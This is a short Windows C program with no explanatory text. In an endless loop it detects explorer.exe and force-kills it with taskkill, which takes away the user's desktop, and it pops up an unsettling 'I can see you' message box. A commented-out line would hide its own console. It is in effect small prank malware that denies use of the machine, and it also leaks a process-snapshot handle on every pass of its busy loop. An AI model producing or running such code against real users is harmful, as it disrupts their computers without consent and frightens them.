/**
 * @file main.c
 * @author Lucas Vieira (lucas.engen.cc@gmail.com)
 * @brief 
 * @version 0.1
 * @date 2020-03-19
 * 
 * @copyright Copyright (c) 2020
 * 
 */

#include <stdio.h>
#include <windows.h>
#include <shellapi.h>
#include <tlhelp32.h>
#include <stdlib.h>

#define u(x)    TEXT(x)

static void HideDesktop()
{
    ShellExecuteW(0, L"open", L"taskkill", L"/f /im explorer.exe", 0, 0);
}

static WINBOOL AreYouKiddingWithMe()
{
    HANDLE snap;
    struct tagPROCESSENTRY32W entry;
    const wchar_t *target = L"explorer.exe";
    size_t len = wcslen(target);

    entry.dwSize = sizeof(struct tagPROCESSENTRY32W);

    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(snap)
    {
        if(Process32FirstW(snap, &entry)) 
        {
            do {
                if(wcsncmp(entry.szExeFile, target, len) == 0)
                    return TRUE;

                wprintf(L"Process: %s\n", entry.szExeFile);

            } while(Process32NextW(snap, &entry));
        } else {
            wprintf(L"Hello %lu\n", GetLastError());
        }
    }

    return FALSE;
}

int main()
{
    //ShowWindow(GetConsoleWindow(), 0);

    while(TRUE)
    {
        if(AreYouKiddingWithMe())
        {
            HideDesktop();
            MessageBoxW(0, L"I can see you", L"Hi", MB_ICONERROR);
        }
    }

    return 0;
}